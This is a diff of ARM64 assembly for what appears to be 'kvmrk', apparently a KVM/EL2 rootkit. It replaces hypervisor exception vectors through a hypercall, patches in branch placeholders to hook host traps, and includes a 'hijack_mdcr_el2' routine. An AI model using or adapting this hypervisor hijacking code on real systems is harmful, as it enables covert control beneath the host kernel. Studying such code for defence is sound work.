@@ -13,60 +13,111 @@
 
 .text
 .pushsection	.kvmrk.text, "ax"
-.align	12
-SYM_CODE_START(kvmrk_vectors)
-	ventry	__invalid		// Synchronous EL2t
-	ventry	__invalid		// IRQ EL2t
-	ventry	__invalid		// FIQ EL2t
-	ventry	__invalid		// Error EL2t
 
-	ventry	__invalid		// Synchronous EL2h
-	ventry	__invalid		// IRQ EL2h
-	ventry	__invalid		// FIQ EL2h
-	ventry	__invalid		// Error EL2h
 
-	ventry	__do_kvmrk_el1_sync		// Synchronous 64-bit EL1
-	ventry	__invalid		// IRQ 64-bit EL1
-	ventry	__invalid		// FIQ 64-bit EL1
-	ventry	__invalid		// Error 64-bit EL1
+.align 12
+SYM_CODE_START(__kvmrk_stub_vectors)
+	ventry	__invalid_stub_vect		// Synchronous EL2t
+	ventry	__invalid_stub_vect		// IRQ EL2t
+	ventry	__invalid_stub_vect		// FIQ EL2t
+	ventry	__invalid_stub_vect		// Error EL2t
 
-	ventry	__invalid		// Synchronous 32-bit EL1
-	ventry	__invalid		// IRQ 32-bit EL1
-	ventry	__invalid		// FIQ 32-bit EL1
-	ventry	__invalid		// Error 32-bit EL1
+	ventry	__invalid_stub_vect		// Synchronous EL2h
+	ventry	__invalid_stub_vect		// IRQ EL2h
+	ventry	__invalid_stub_vect		// FIQ EL2h
+	ventry	__invalid_stub_vect		// Error EL2h
 
-__invalid:
+	ventry	__kvmrk_stub_el1_sync	// Synchronous 64-bit EL1
+	ventry	__invalid_stub_vect		// IRQ 64-bit EL1
+	ventry	__invalid_stub_vect		// FIQ 64-bit EL1
+	ventry	__invalid_stub_vect		// Error 64-bit EL1
+
+	ventry	__invalid_stub_vect		// Synchronous 32-bit EL1
+	ventry	__invalid_stub_vect		// IRQ 32-bit EL1
+	ventry	__invalid_stub_vect		// FIQ 32-bit EL1
+	ventry	__invalid_stub_vect		// Error 32-bit EL1
+
+__invalid_stub_vect:
 	b	.
-__do_kvmrk_el1_sync:
-	mrs 	x18, esr_el2 // clobbers x18 bc stack isnt setup kms
-	lsr 	x18, x18, #ESR_ELx_EC_SHIFT
+__kvmrk_stub_el1_sync:
+// x0 = KVMRK_INIT_VECTORS: x1 = new vbar_el2, x2 = sp_el2
+	/*
+	mrs		x18, esr_el2
+	lsr		x18, x18, #ESR_ELx_EC_SHIFT
 	cmp		x18, #ESR_ELx_EC_HVC64
-	b.ne	not_hypercall
-1:
-	// jump to handle trap, move hvc handlers into handle trap
-	// leave nops to install handle trap since address isnt known at runtime ?
-	cmp	    x0, #KVMRK_CALL_HYP
-	bne		1f
-	br 		x1
+	bne 	__bad_exit
+	*/
+
+	cmp	    x0, #KVMRK_HVC_INIT_VECTORS
+	bne		__bad_exit
+	msr 	vbar_el2, x1
+	mov 	sp, x2
+	// msr		spsel, 1 // C5.2.16
+	mov 	x0, sp
 	eret
-1:
-	cmp 	x0, #KVMRK_CRASH_EVERYTHING
-	bne 	1f
-	mov		x0, xzr
+__bad_exit:
+	mov_q	x0, 0xdeadca11
 	eret
-1:
-	cmp 	x0, #KVMRK_SET_SP
-	b.ne	not_hypercall
-	mov 	sp, x1
-	mov		x0, x1
-	eret
-not_hypercall:
-	// save host context
+SYM_CODE_END(__kvmrk_stub_vectors)
+kvmrk_end __kvmrk_stub_vectors_end
+
+
+
+.align	12
+SYM_CODE_START(__kvmrk_vectors)
+	ventry	__invalid_vect		// Synchronous EL2t
+	ventry	__invalid_vect		// IRQ EL2t
+	ventry	__invalid_vect		// FIQ EL2t
+	ventry	__invalid_vect		// Error EL2t
+
+	ventry	__invalid_vect		// Synchronous EL2h
+	ventry	__invalid_vect		// IRQ EL2h
+	ventry	__invalid_vect		// FIQ EL2h
+	ventry	__invalid_vect		// Error EL2h
+
+	ventry	__kvmrk_el1_sync		// Synchronous 64-bit EL1
+	ventry	__invalid_vect		// IRQ 64-bit EL1
+	ventry	__invalid_vect		// FIQ 64-bit EL1
+	ventry	__invalid_vect		// Error 64-bit EL1
+
+	ventry	__invalid_vect		// Synchronous 32-bit EL1
+	ventry	__invalid_vect		// IRQ 32-bit EL1
+	ventry	__invalid_vect		// FIQ 32-bit EL1
+	ventry	__invalid_vect		// Error 32-bit EL1
+
+__invalid_vect:
+	b 	.
+__kvmrk_el1_sync:
 	stp	x0, x1, [sp, #-16]!
+	stp	x2, x3, [sp, #-16]!
+
+	/*
+	// https://elixir.bootlin.com/linux/v5.15/source/arch/arm64/kvm/hyp/nvhe/host.S#L116
 	mrs	x0, esr_el2
 	lsr	x0, x0, #ESR_ELx_EC_SHIFT
+	kvm_get_host_ctxt	x0, x1
+	*/
 
-	kvmrk_get_host_ctxt		x0, x1
+	b __fixup_1_end
+
+// enable mmu, skidrip linux kernel
+.globl __fixup_1
+__fixup_1:
+	nop
+	nop
+__fixup_1_end:
+	ldr 	x0, __fixup_1
+	ldr		x0, [x0]
+	mrs 	x1, mpidr_el1
+	// https://elixir.bootlin.com/linux/latest/source/arch/arm/include/asm/cputype.h#L54
+	mov_q 	x2, 0xffffff // MPIDR_HWID_BITMASK
+	and   	x1, x1, x2
+	mov     x2, #SIZEOF_KVM_HOST_DATA
+	madd	x0, x1, x2, x0
+
+	add x0, x0, #HOST_DATA_CONTEXT
+
+	ldp	x2, x3, [sp], #16	// orig x2, x3
 
 	/* Store the host regs x2 and x3 */
 	stp	x2, x3,   [x0, #CPU_XREG_OFFSET(2)]
@@ -90,9 +141,9 @@ not_hypercall:
 	/* Save the host context pointer in x29 across the function call */
 	mov	x29, x0
 
-.globl copy_here_start
-copy_here_start:
-	// placeholder to copy lame jump
+.globl __fixup_2
+__fixup_2:
+	// placeholder to copy branch to kvmrk_handle_trap pa
 	nop
 	nop
 	nop
@@ -121,16 +172,20 @@ __host_enter_for_panic:
 __host_enter_without_restoring:
 	eret
 	sb
-SYM_CODE_END(kvmrk_vectors)
+SYM_CODE_END(__kvmrk_vectors)
+kvmrk_end __kvmrk_vectors_end
 
 .align 12
-SYM_CODE_START(hijack_mdcr_el2)
+SYM_CODE_START(__hijack_mdcr_el2)
+	/*
 	mrs 	x0, mdcr_el2
 	orr 	x0, x0, #MDCR_EL2_TDA
 	msr 	mdcr_el2, x0
-	mov_q	x0, 0xdeadbeef
+	mov_q	x0, 0x333
+	*/
 	eret
-SYM_CODE_END(hijack_mdcr_el2)
+SYM_CODE_END(__hijack_mdcr_el2)
+kvmrk_end __hijack_mdcr_el2_end
 
 
 
@@ -150,10 +205,10 @@ SYM_FUNC_START(kvmrk_hvc)
 	ret
 SYM_FUNC_END(kvmrk_hvc)
 
-SYM_FUNC_START(kvmrk_flush_virt)
+SYM_FUNC_START(_helper_flush_virt)
 	dc 		cvac, x0
 	ret
-SYM_FUNC_END(kvmrk_flush_virt)
+SYM_FUNC_END(_helper_flush_virt)
 
 SYM_FUNC_START(kvmrk_set_vectors)
 	mov		x1, x0
